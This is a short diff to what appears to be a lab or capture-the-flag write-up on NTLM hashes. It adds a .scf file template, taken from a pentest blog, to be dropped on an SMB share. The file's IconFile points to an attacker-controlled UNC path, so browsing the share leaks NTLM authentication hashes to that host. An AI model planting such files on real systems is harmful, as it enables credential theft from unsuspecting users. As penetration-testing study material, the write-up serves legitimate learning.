@@ -71,4 +71,15 @@ NTLM hash is designed to hash passwords and other data for security,
  but it's considered relatively weak compared to more modern hashing algorithms like bcrypt or Argon2.
 ```
 
+Since there is SMB Share, i used this template `.scf` file from this --> https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/.
+
+> SCF FILE
+
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.4\tools\nc.ico
+[Taskbar]
+Command=ToggleDesktop
+```
 
